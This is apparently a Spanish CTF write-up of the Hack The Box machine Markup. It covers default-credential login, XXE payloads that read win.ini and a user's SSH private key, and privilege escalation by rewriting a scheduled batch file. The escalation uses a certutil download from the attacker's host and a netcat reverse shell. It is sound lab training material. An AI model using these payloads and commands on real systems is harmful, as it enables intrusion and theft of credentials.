---
tags:
  - CTF
  - estado/incompleto
  - OSCP
  - windows
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/Markup
dificultad: Fácil
ip:
os: Windows
relacionados:
  - "[[XML External Entity (XXE)]]"
  - "[[Default credentials]]"
---
# HackTheBox - Markup

## Reconocimiento

Como siempre, mi primer paso es el reconocimiento, por lo que comencé con un escaneo de `nmap` para identificar los servicios expuestos en la máquina.

```Bash
nmap -sC -A -Pn <TARGET_IP>
```

El escaneo reveló tres puertos abiertos:
- **22/tcp (SSH):** OpenSSH.
- **80/tcp (HTTP):** Apache httpd.
- **443/tcp (HTTPS):** Apache httpd.

Sin credenciales a la mano, mi siguiente paso lógico fue investigar el servidor web en el puerto 80. Al acceder, me encontré con una página de inicio de sesión simple. Procedí a probar una serie de credenciales por defecto.

> [!SUCCESS] Credenciales Válidas
> 
> Después de varios intentos, logré iniciar sesión con las credenciales admin:password.

Una vez dentro, exploré las diferentes secciones de la aplicación. La página "Order" captó mi atención de inmediato, ya que presentaba un formulario con varios campos de entrada, un lugar ideal para buscar vulnerabilidades de inyección.


---

## Análisis de vulnerabilidades

### Descubrimiento de XXE (XML External Entity)

Para entender cómo la aplicación procesaba los datos del formulario "Order", configuré mi proxy local y utilicé **Burp Suite** para interceptar la solicitud. Al enviar el formulario con datos de prueba, confirmé que la aplicación enviaba la información en formato XML.

Al ver la estructura XML, mi primer pensamiento fue probar una vulnerabilidad de **XML External Entity (XXE)**. Esta vulnerabilidad ocurre cuando un parser XML mal configurado procesa entidades externas definidas por el usuario, lo que puede permitir la lectura de archivos locales, entre otros ataques.

Para confirmar mi sospecha, modifiqué la solicitud interceptada en el **Repeater** de Burp Suite. Inyecté una entidad XML que intentaba leer un archivo conocido del sistema operativo Windows, como `C:\windows\win.ini`.

Mi payload fue el siguiente:
```XML
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```

> [!VULNERABILITY] XXE Confirmado
> 
> Al enviar la solicitud modificada, el servidor respondió mostrando el contenido del archivo win.ini dentro de la etiqueta _item_. Esto confirmó sin lugar a dudas que la aplicación era vulnerable a ataques XXE.


---

## Explotación de vulnerabilidades

### Obtención de la clave SSH de Daniel

Con la capacidad de leer archivos locales, mi objetivo era encontrar información sensible para obtener un shell en el sistema. Al inspeccionar el código fuente de una de las páginas web, encontré un comentario interesante: `Modified by Daniel`.

Este comentario me dio una pista valiosa: probablemente existía un usuario llamado `daniel` en el sistema. Mi siguiente paso fue intentar leer su clave privada SSH, que en Windows suele ubicarse en `C:\Users\daniel\.ssh\id_rsa`.

Ajusté mi payload XXE para apuntar a esa ruta:
```XML
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY sshkey SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order>
<quantity>
1
</quantity>
<item>
&sshkey;
</item>
<address>
17th Estate, CA
</address>
</order>
```

¡Éxito! El servidor respondió con el contenido completo del archivo `id_rsa`.

### Acceso como Daniel

Con la clave privada en mi poder, el siguiente paso era utilizarla para acceder al sistema a través de SSH.

1. Copié la clave privada y la guardé en un archivo local llamado `id_rsa`.
2. Asigné los permisos correctos al archivo para que el cliente SSH la aceptara.
    
> [!WARNING] Permisos de Clave SSH
> 
> Es crucial que los permisos de la clave privada sean restrictivos. El cliente SSH rechazará la clave si los permisos son demasiado abiertos. El comando chmod 600 es el estándar para esto.

```Bash
chmod 600 id_rsa
```

Finalmente, utilicé la clave para autenticarme como el usuario `daniel`.
```Bash
ssh -i id_rsa daniel@<TARGET_IP>
```

Conseguí acceder a la máquina y pude leer la bandera de usuario ubicada en el escritorio de `daniel`.


---

## Escalada de privilegios

### Enumeración Interna

Una vez dentro como `daniel`, mi objetivo era escalar privilegios a Administrador. Primero, verifiqué los privilegios del usuario actual con el comando `whoami /priv`, pero no encontré nada fuera de lo común que pudiera explotar directamente.

Continué con la enumeración del sistema de archivos en busca de archivos o configuraciones inusuales. En el directorio `C:\` encontré una carpeta llamada `Log-Management`. Dentro de ella, había un archivo `job.bat` que llamó mi atención.

Al examinar su contenido, vi que el script utilizaba `wevtutil.exe` para limpiar logs, y los comentarios indicaban que solo podía ser ejecutado por un Administrador.1
```Fragmento de código
@echo off
REM Only Admins can run this script
wevtutil.exe cl System
wevtutil.exe cl Security
wevtutil.exe cl Application
```

### Abuso de Permisos de Archivo

Mi hipótesis era que si el script era ejecutado periódicamente por una cuenta con privilegios elevados, y yo tenía permisos de escritura sobre él, podría modificarlo para ejecutar mi propio código.

Para verificar los permisos del archivo, utilicé el comando `icacls`.
```DOS
icacls C:\Log-Management\job.bat
```

> [!VULNERABILITY] Permisos de Archivo Inseguros
> 
> El resultado de icacls reveló que el grupo BUILTIN\Users tenía control total (F) sobre el archivo job.bat. Como daniel es miembro de este grupo, yo tenía permisos completos para modificar el script.

Para confirmar que el script se estaba ejecutando, revisé las tareas programadas con `schtasks`. Efectivamente, había una tarea que ejecutaba este script periódicamente.

### Preparando el Payload

El plan era simple:
1. Transferir un ejecutable de `netcat` a la máquina víctima.
2. Sobrescribir el contenido de `job.bat` con un comando para ejecutar una reverse shell.
3. Poner un listener en mi máquina y esperar la conexión.
    
Como la máquina víctima no tenía conexión a Internet, levanté un servidor HTTP simple con Python en mi máquina para alojar `nc64.exe`.
```Bash
# En mi máquina atacante
python3 -m http.server 80
```

Luego, desde la shell de `daniel` en la máquina víctima, descargué el archivo.
```PowerShell
# En la máquina víctima (usando PowerShell)
certutil.exe -urlcache -split -f http://<MI_IP>/nc64.exe C:\Log-Management\nc64.exe
```

### Obteniendo la Shell de Administrador

Con `nc64.exe` en su lugar, modifiqué el script `job.bat` para que me enviara una shell de `cmd.exe`.

> [!CAUTION] CMD vs PowerShell
> 
> Es importante ejecutar este comando desde una cmd.exe y no desde PowerShell, ya que el manejo de la redirección y las comillas puede variar y hacer que el payload falle.

```DOS
# En la máquina víctima (cmd.exe)
echo C:\Log-Management\nc64.exe -e cmd.exe <MI_IP> <MI_PUERTO> > C:\Log-Management\job.bat
```

En mi máquina, puse un listener de `netcat` a la espera en el puerto especificado.
```Bash
# En mi máquina atacante
nc -lvnp <MI_PUERTO>
```

Solo tuve que esperar unos momentos a que la tarea programada se ejecutara. Cuando lo hizo, recibí una conexión entrante en mi listener, ¡y obtuve una shell como `nt authority\system`!

Con privilegios de Administrador, pude leer la bandera final desde `C:\Users\Administrator\Desktop\root.txt`.

---

### Vulnerabilidades y Conceptos Clave

- **XXE (XML External Entity):** La vulnerabilidad principal que permitió la lectura de archivos locales en el servidor web. Se explotó para filtrar la clave SSH de un usuario.
    
- **Permisos de Archivo Inseguros:** El grupo `BUILTIN\Users` tenía control total sobre un script (`job.bat`) que era ejecutado por una cuenta con privilegios elevados. Este fue el punto clave para la escalada de privilegios.
    
- **Abuso de Tareas Programadas:** Se aprovechó una tarea programada que ejecutaba un script vulnerable para conseguir la ejecución de código como Administrador.
    
- **Credenciales por Defecto:** El acceso inicial se obtuvo gracias a una contraseña débil y común (`admin:password`) en el panel de administración web.


___

## Bandera(s)

> [!FLAG] `flag{user}`
^bandera

> [!FLAG] `flag{root}`
^bandera